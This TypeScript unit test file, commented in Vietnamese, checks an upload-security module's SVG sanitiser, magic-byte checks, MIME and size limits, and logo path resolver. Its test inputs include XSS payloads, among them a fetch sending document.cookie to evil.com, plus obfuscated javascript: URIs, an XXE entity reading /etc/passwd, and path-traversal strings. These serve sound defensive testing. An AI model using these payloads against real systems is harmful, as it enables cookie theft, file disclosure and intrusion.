import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { join } from 'node:path';
import { mkdirSync, writeFileSync, rmSync, realpathSync } from 'node:fs';
import {
    sanitizeSvg,
    validateMagicBytes,
    validateUploadedFile,
    generateSafeFilePath,
    resolveLogoPath,
    LOGOS_DIR,
    ALLOWED_MIME_TYPES,
    MAX_FILE_SIZE_BYTES,
} from '../../src/security/uploadGuard.js';

// ============================================================
// UNIT TEST MODULE: src/security/uploadGuard.ts
// Mục tiêu: Đảm bảo bộ lọc bảo mật chặn đúng mọi loại file
//           độc hại và cho phép file hợp lệ đi qua.
// Chạy lệnh: node.exe --import tsx tests/unit/uploadGuard.test.ts
// ============================================================

// ─── Hàm tiện ích tạo Buffer giả lập file PNG/JPEG/WEBP ────

/** Tạo buffer PNG hợp lệ (có magic bytes đúng chuẩn) */
function makePngBuffer(): Buffer {
    // PNG header: 89 50 4E 47 0D 0A 1A 0A
    return Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, ...Buffer.alloc(100)]);
}

/** Tạo buffer JPEG hợp lệ */
function makeJpegBuffer(): Buffer {
    // JPEG header: FF D8 FF E0
    return Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, ...Buffer.alloc(100)]);
}

/** Tạo buffer WEBP hợp lệ */
function makeWebpBuffer(): Buffer {
    // RIFF....WEBP
    const buf = Buffer.alloc(20);
    buf.write('RIFF', 0, 'ascii');   // byte 0-3
    buf.writeUInt32LE(12, 4);        // byte 4-7: kích thước
    buf.write('WEBP', 8, 'ascii');   // byte 8-11
    return buf;
}

/** Tạo buffer SVG hợp lệ từ chuỗi nội dung */
function makeSvgBuffer(content: string): Buffer {
    return Buffer.from(content, 'utf-8');
}


describe('Module: uploadGuard (src/security/uploadGuard.ts)', () => {

    // ─────────────────────────────────────────────────────────
    // TC-UG-001: Kiểm tra hàm sanitizeSvg — loại bỏ mã độc XSS
    // ─────────────────────────────────────────────────────────
    describe('TC-UG-001: sanitizeSvg() loại bỏ mã độc XSS', () => {

        it('phải xóa thẻ <script>...</script> chứa mã độc', () => {
            const malicious = `<svg><script>alert('XSS')</script><circle r="10"/></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('<script'), `Kỳ vọng không còn <script> nhưng nhận: ${result}`);
            assert.ok(!result.includes('alert'), `Kỳ vọng không còn alert() nhưng nhận: ${result}`);
            // Phần nội dung hợp lệ phải còn lại
            assert.ok(result.includes('<circle'), 'Phần tử hợp lệ <circle> phải được giữ lại');
        });

        it('phải xóa thẻ <script ... /> tự đóng', () => {
            const malicious = `<svg><script src="http://evil.com/xss.js"/><rect/></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('<script'), `Kỳ vọng không còn <script> nhưng nhận: ${result}`);
        });

        it('phải xóa event handler onload="..."', () => {
            const malicious = `<svg onload="fetch('http://evil.com?c='+document.cookie)"><rect/></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('onload'), `Kỳ vọng không còn onload nhưng nhận: ${result}`);
            assert.ok(!result.includes('fetch'), `Kỳ vọng không còn fetch() nhưng nhận: ${result}`);
        });

        it('phải xóa event handler onclick="..."', () => {
            const malicious = `<svg><rect onclick="stealData()"/></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('onclick'), `Kỳ vọng không còn onclick nhưng nhận: ${result}`);
        });

        it('phải xóa event handler onerror="..."', () => {
            const malicious = `<svg><image onerror="alert(1)" href="x"/></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('onerror'), `Kỳ vọng không còn onerror nhưng nhận: ${result}`);
        });

        it('phải xóa href="javascript:..." (JavaScript URI)', () => {
            const malicious = `<svg><a href="javascript:alert('xss')"><text>Click me</text></a></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('javascript:'), `Kỳ vọng không còn javascript: URI nhưng nhận: ${result}`);
        });

        it('phải xóa href chứa javascript: bị làm mờ (tab, entity, whitespace, colon entity, data html)', () => {
            const cases = [
                `<svg><a href="java\x09script:alert(1)"><text>Click</text></a></svg>`,
                `<svg><a href="javascript :alert(1)"><text>Click</text></a></svg>`,
                `<svg><a href="&#x6a;avascript:alert(1)"><text>Click</text></a></svg>`,
                `<svg><a href="jav&#x0a;ascript:alert(1)"><text>Click</text></a></svg>`,
                `<svg><a href="javascript&colon;alert(1)"><text>Click</text></a></svg>`,
                `<svg><a href="vbscript:msgbox(1)"><text>Click</text></a></svg>`,
                `<svg><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><text>Click</text></a></svg>`,
            ];

            for (const svg of cases) {
                const res = sanitizeSvg(svg);
                assert.ok(
                    !res.includes('alert') && !res.includes('msgbox') && !res.includes('PHNjcmlwdD'),
                    `Payload phải bị loại bỏ nhưng nhận: ${res}`
                );
            }
        });

        it('phải giữ lại href="#id" nội bộ hợp lệ', () => {
            // href trỏ đến id nội bộ (dấu #) là bình thường trong SVG, không nên xóa
            const safe = `<svg><use href="#icon"/><symbol id="icon"><circle r="5"/></symbol></svg>`;
            const result = sanitizeSvg(safe);

            assert.ok(result.includes('href="#icon"'), `href nội bộ phải được giữ lại nhưng nhận: ${result}`);
        });

        it('phải xóa thẻ <foreignObject> cho phép nhúng HTML tùy ý', () => {
            const malicious = `<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('foreignObject'), `Kỳ vọng không còn foreignObject nhưng nhận: ${result}`);
        });

        it('SVG sạch không bị thay đổi sau sanitize', () => {
            // SVG logo đơn giản, hoàn toàn hợp lệ, không có mã độc
            const cleanSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <circle cx="50" cy="50" r="40" fill="blue"/>
  <text x="50" y="55" text-anchor="middle" fill="white">LOGO</text>
</svg>`;
            const result = sanitizeSvg(cleanSvg);

            // Nội dung không bị thay đổi đáng kể
            assert.ok(result.includes('<circle'), 'circle phải còn nguyên');
            assert.ok(result.includes('fill="blue"'), 'thuộc tính fill phải còn nguyên');
            assert.ok(result.includes('LOGO'), 'text LOGO phải còn nguyên');
        });
    });

    // ─────────────────────────────────────────────────────────
    // TC-UG-002: Kiểm tra hàm sanitizeSvg — loại bỏ XXE
    // ─────────────────────────────────────────────────────────
    describe('TC-UG-002: sanitizeSvg() chặn tấn công XXE', () => {

        it('phải xóa khai báo <!ENTITY> (XXE injection)', () => {
            // Tấn công XXE: khai báo entity để đọc file hệ thống
            const malicious = `<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('<!ENTITY'), `Kỳ vọng không còn <!ENTITY nhưng nhận: ${result}`);
            assert.ok(!result.includes('SYSTEM'), `Kỳ vọng không còn SYSTEM entity nhưng nhận: ${result}`);
        });

        it('phải xóa khai báo <!DOCTYPE>', () => {
            const malicious = `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg><circle r="10"/></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('<!DOCTYPE'), `Kỳ vọng không còn <!DOCTYPE nhưng nhận: ${result}`);
        });
    });

    // ─────────────────────────────────────────────────────────
    // TC-UG-003: Kiểm tra validateMagicBytes()
    // ─────────────────────────────────────────────────────────
    describe('TC-UG-003: validateMagicBytes() nhận diện đúng định dạng file', () => {

        it('PNG hợp lệ => trả về true', () => {
            assert.strictEqual(validateMagicBytes(makePngBuffer(), 'image/png'), true);
        });

        it('JPEG hợp lệ => trả về true', () => {
            assert.strictEqual(validateMagicBytes(makeJpegBuffer(), 'image/jpeg'), true);
        });

        it('WEBP hợp lệ => trả về true', () => {
            assert.strictEqual(validateMagicBytes(makeWebpBuffer(), 'image/webp'), true);
        });

        it('SVG hợp lệ (có thẻ <svg) => trả về true', () => {
            const svgBuf = makeSvgBuffer('<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>');
            assert.strictEqual(validateMagicBytes(svgBuf, 'image/svg+xml'), true);
        });

        it('SVG hợp lệ (bắt đầu bằng <?xml) => trả về true', () => {
            const svgBuf = makeSvgBuffer('<?xml version="1.0"?><svg><circle r="5"/></svg>');
            assert.strictEqual(validateMagicBytes(svgBuf, 'image/svg+xml'), true);
        });

        it('File giả mạo: nội dung text nhưng khai báo MIME là image/png => trả về false', () => {
            // Kẻ tấn công đổi tên file .js thành .png
            const fakePng = Buffer.from('console.log("I am not a PNG")');
            assert.strictEqual(validateMagicBytes(fakePng, 'image/png'), false);
        });

        it('File giả mạo: exe bytes nhưng khai báo là JPEG => trả về false', () => {
            // Magic bytes của PE executable: 4D 5A (MZ)
            const fakeJpeg = Buffer.from([0x4D, 0x5A, 0x90, 0x00, ...Buffer.alloc(50)]);
            assert.strictEqual(validateMagicBytes(fakeJpeg, 'image/jpeg'), false);
        });

        it('MIME type không xác định => trả về false', () => {
            assert.strictEqual(validateMagicBytes(makePngBuffer(), 'application/octet-stream'), false);
        });
    });

    // ─────────────────────────────────────────────────────────
    // TC-UG-004: Kiểm tra validateUploadedFile() — hàm tổng hợp
    // ─────────────────────────────────────────────────────────
    describe('TC-UG-004: validateUploadedFile() kiểm tra toàn diện', () => {

        it('PNG hợp lệ => isValid=true, không có reason', () => {
            const result = validateUploadedFile(makePngBuffer(), 'image/png');
            assert.strictEqual(result.isValid, true);
            assert.strictEqual(result.reason, undefined);
        });

        it('JPEG hợp lệ => isValid=true', () => {
            const result = validateUploadedFile(makeJpegBuffer(), 'image/jpeg');
            assert.strictEqual(result.isValid, true);
        });

        it('SVG hợp lệ => isValid=true và có sanitizedContent', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><circle r="10"/></svg>';
            const result = validateUploadedFile(makeSvgBuffer(svg), 'image/svg+xml');

            assert.strictEqual(result.isValid, true);
            assert.ok(typeof result.sanitizedContent === 'string', 'sanitizedContent phải là string');
            assert.ok(result.sanitizedContent!.includes('<circle'), 'Nội dung SVG hợp lệ phải còn lại');
        });

        it('SVG độc hại => isValid=true nhưng sanitizedContent đã được làm sạch', () => {
            // File SVG có mã độc nhưng cấu trúc SVG hợp lệ → vẫn chấp nhận nhưng làm sạch
            const maliciousSvg = '<svg><script>alert(1)</script><circle r="5"/></svg>';
            const result = validateUploadedFile(makeSvgBuffer(maliciousSvg), 'image/svg+xml');

            assert.strictEqual(result.isValid, true, 'File SVG vẫn được chấp nhận sau sanitize');
            assert.ok(!result.sanitizedContent!.includes('<script'), 'Script phải bị xóa khỏi sanitizedContent');
        });

        it('File quá lớn (>5MB) => isValid=false', () => {
            // Tạo buffer 6MB
            const bigFile = Buffer.alloc(MAX_FILE_SIZE_BYTES + 1);
            const result = validateUploadedFile(bigFile, 'image/png');

            assert.strictEqual(result.isValid, false);
            assert.ok(result.reason?.includes('5MB'), `Lý do phải đề cập giới hạn 5MB, nhận: ${result.reason}`);
        });

        it('MIME type không được phép (PDF) => isValid=false', () => {
            const pdfBytes = Buffer.from('%PDF-1.4 fake pdf content');
            const result = validateUploadedFile(pdfBytes, 'application/pdf');

            assert.strictEqual(result.isValid, false);
            assert.ok(result.reason?.includes('application/pdf'), `Lý do phải đề cập MIME type bị từ chối`);
        });

        it('PNG giả mạo (magic bytes sai) => isValid=false', () => {
            // Nội dung là text nhưng khai báo MIME là PNG
            const fakePng = Buffer.from('This is not a PNG file at all');
            const result = validateUploadedFile(fakePng, 'image/png');

            assert.strictEqual(result.isValid, false);
            assert.ok(result.reason?.includes('giả mạo') || result.reason?.includes('khớp'),
                `Lý do phải đề cập file giả mạo, nhận: ${result.reason}`);
        });
    });

    // ─────────────────────────────────────────────────────────
    // TC-UG-005: Kiểm tra generateSafeFilePath()
    // ─────────────────────────────────────────────────────────
    describe('TC-UG-005: generateSafeFilePath() tạo đường dẫn an toàn', () => {
        const TEST_DIR = 'C:\\tmp\\test_upload_guard';

        it('PNG => đường dẫn kết thúc bằng .png và chứa UUID', () => {
            const path = generateSafeFilePath('image/png', TEST_DIR);

            assert.ok(path.endsWith('.png'), `Kỳ vọng .png nhưng nhận: ${path}`);
            // UUID có dạng 8-4-4-4-12 ký tự hex
            assert.match(path, /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.png$/i);
        });

        it('SVG => đường dẫn kết thúc bằng .svg', () => {
            const path = generateSafeFilePath('image/svg+xml', TEST_DIR);
            assert.ok(path.endsWith('.svg'), `Kỳ vọng .svg nhưng nhận: ${path}`);
        });

        it('JPEG => đường dẫn kết thúc bằng .jpg', () => {
            const path = generateSafeFilePath('image/jpeg', TEST_DIR);
            assert.ok(path.endsWith('.jpg'), `Kỳ vọng .jpg nhưng nhận: ${path}`);
        });

        it('WEBP => đường dẫn kết thúc bằng .webp', () => {
            const path = generateSafeFilePath('image/webp', TEST_DIR);
            assert.ok(path.endsWith('.webp'), `Kỳ vọng .webp nhưng nhận: ${path}`);
        });

        it('Hai lần gọi liên tiếp phải tạo ra 2 đường dẫn khác nhau (UUID ngẫu nhiên)', () => {
            const path1 = generateSafeFilePath('image/png', TEST_DIR);
            const path2 = generateSafeFilePath('image/png', TEST_DIR);

            assert.notStrictEqual(path1, path2, 'Hai đường dẫn phải khác nhau (UUID unique)');
        });
    });

    // ─────────────────────────────────────────────────────────
    // TC-UG-006: Kiểm tra hằng số cấu hình
    // ─────────────────────────────────────────────────────────
    describe('TC-UG-006: Hằng số cấu hình bảo mật', () => {

        it('MAX_FILE_SIZE_BYTES phải đúng bằng 5MB (5 * 1024 * 1024)', () => {
            assert.strictEqual(MAX_FILE_SIZE_BYTES, 5 * 1024 * 1024);
        });

        it('ALLOWED_MIME_TYPES phải chứa đủ 4 loại định dạng ảnh hợp lệ', () => {
            assert.ok(ALLOWED_MIME_TYPES.includes('image/png'), 'Phải cho phép PNG');
            assert.ok(ALLOWED_MIME_TYPES.includes('image/jpeg'), 'Phải cho phép JPEG');
            assert.ok(ALLOWED_MIME_TYPES.includes('image/svg+xml'), 'Phải cho phép SVG');
            assert.ok(ALLOWED_MIME_TYPES.includes('image/webp'), 'Phải cho phép WEBP');
        });

        it('ALLOWED_MIME_TYPES không được chứa định dạng nguy hiểm', () => {
            assert.ok(!ALLOWED_MIME_TYPES.includes('application/pdf'), 'Không được cho phép PDF');
            assert.ok(!ALLOWED_MIME_TYPES.includes('text/html'), 'Không được cho phép HTML');
            assert.ok(!ALLOWED_MIME_TYPES.includes('application/javascript'), 'Không được cho phép JS');
        });
    });

    // ─────────────────────────────────────────────────────────
    // TC-UG-007: sanitizeSvg() chặn kỹ thuật lách regex `<svg/onload=...>`
    // ─────────────────────────────────────────────────────────
    describe('TC-UG-007: sanitizeSvg() chặn event handler không có khoảng trắng', () => {

        it('phải xóa onload trong `<svg/onload="alert(1)">`', () => {
            const malicious = `<svg/onload="alert(1)"><circle r="10"/></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.includes('onload'), `Kỳ vọng không còn onload nhưng nhận: ${result}`);
            assert.ok(!result.includes('alert'), `Kỳ vọng không còn alert() nhưng nhận: ${result}`);
            assert.ok(result.includes('<circle'), 'Phần tử hợp lệ <circle> phải được giữ lại');
        });

        it('phải xóa event handler viết hoa/không có dấu ngoặc kép', () => {
            const malicious = `<svg><rect ONCLICK=stealData() /></svg>`;
            const result = sanitizeSvg(malicious);

            assert.ok(!result.toLowerCase().includes('onclick'), 'Kỳ vọng không còn onclick');
            assert.ok(!result.includes('stealData'), 'Kỳ vọng không còn stealData()');
        });
    });

    // ─────────────────────────────────────────────────────────
    // TC-UG-008: resolveLogoPath() giới hạn phạm vi đường dẫn logo
    // ─────────────────────────────────────────────────────────
    describe('TC-UG-008: resolveLogoPath() chỉ chấp nhận file trong thư mục logos', () => {
        const TEST_LOGO_DIR = join(LOGOS_DIR);

        it('phải từ chối đường dẫn tuyệt đối ngoài thư mục logos (LFI)', () => {
            assert.strictEqual(resolveLogoPath('/etc/passwd'), null);
            assert.strictEqual(resolveLogoPath('/etc/hostname'), null);
        });

        it('phải từ chối path traversal dạng ../', () => {
            assert.strictEqual(resolveLogoPath('../../etc/passwd'), null);
            assert.strictEqual(resolveLogoPath('/uploads/logos/../../etc/passwd'), null);
        });

        it('phải từ chối thiết bị đặc biệt như /dev/zero (chống DoS treo worker)', () => {
            assert.strictEqual(resolveLogoPath('/dev/zero'), null);
        });

        it('phải từ chối file không tồn tại', () => {
            assert.strictEqual(
                resolveLogoPath('/uploads/logos/00000000-0000-0000-0000-000000000000.png'),
                null
            );
        });

        it('phải chấp nhận URL tĩnh hợp lệ trỏ tới file logo thật', () => {
            mkdirSync(TEST_LOGO_DIR, { recursive: true });
            const name = `unit-test-${Date.now()}.png`;
            const abs = join(TEST_LOGO_DIR, name);
            writeFileSync(abs, makePngBuffer());
            try {
                const resolved = resolveLogoPath(`/uploads/logos/${name}`);
                assert.ok(resolved, 'Kỳ vọng resolve được đường dẫn hợp lệ');
                assert.strictEqual(resolved, realpathSync(abs));
            } finally {
                rmSync(abs, { force: true });
            }
        });

        it('phải chấp nhận đường dẫn tuyệt đối nằm trong thư mục logos', () => {
            mkdirSync(TEST_LOGO_DIR, { recursive: true });
            const name = `unit-test-abs-${Date.now()}.png`;
            const abs = join(TEST_LOGO_DIR, name);
            writeFileSync(abs, makePngBuffer());
            try {
                assert.strictEqual(resolveLogoPath(abs), realpathSync(abs));
            } finally {
                rmSync(abs, { force: true });
            }
        });
    });
});
